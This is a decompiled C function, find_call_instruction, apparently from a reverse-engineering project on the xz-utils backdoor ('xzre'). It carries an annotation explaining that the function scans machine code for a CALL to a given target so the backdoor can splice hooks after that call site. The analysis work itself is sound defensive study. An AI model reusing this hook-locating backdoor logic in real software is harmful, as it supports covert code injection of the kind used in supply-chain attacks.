// /home/kali/xzre-ghidra/xzregh/100C90_find_call_instruction.c
// Function: find_call_instruction @ 0x100C90
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_call_instruction(u8 * code_start, u8 * code_end, u8 * call_target, dasm_ctx_t * dctx)


/*
 * AutoDoc: Initialises a scratch decoder (or reuses the caller’s `dctx`) and decodes forward from `code_start` to `code_end`, skipping undecodable bytes along the way.
 * It looks for the normalised CALL opcode (`0x168`) and, when `call_target` is non-null, requires that the rel32 destination computed from `instruction + instruction_size + operand` matches that target.
 * The function returns TRUE with the context still describing the CALL so that higher-level code can splice hooks immediately after the call site.
 */

#include "xzre_types.h"

BOOL find_call_instruction(u8 *code_start,u8 *code_end,u8 *call_target,dasm_ctx_t *dctx)

{
  BOOL decode_ok;
  long clear_idx;
  dasm_ctx_t *zero_ctx;
  byte clear_stride_marker;
  dasm_ctx_t scratch_ctx;
  
  clear_stride_marker = 0;
  decode_ok = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x81,4,7);
  if (decode_ok != FALSE) {
    zero_ctx = &scratch_ctx;
    for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
      *(undefined4 *)&zero_ctx->instruction = 0;
      zero_ctx = (dasm_ctx_t *)((long)zero_ctx + ((ulong)clear_stride_marker * -2 + 1) * 4);
    }
    if (dctx == (dasm_ctx_t *)0x0) {
      dctx = &scratch_ctx;
    }
    while (code_start < code_end) {
      decode_ok = x86_dasm(dctx,code_start,code_end);
      if (decode_ok == FALSE) {
        code_start = code_start + 1;
      }
      else {
        if ((*(int *)(dctx->opcode_window + 3) == 0x168) &&
           ((call_target == (u8 *)0x0 ||
            (dctx->instruction + dctx->instruction_size + dctx->operand == call_target)))) {
          return TRUE;
        }
        code_start = code_start + dctx->instruction_size;
      }
    }
  }
  return FALSE;
}

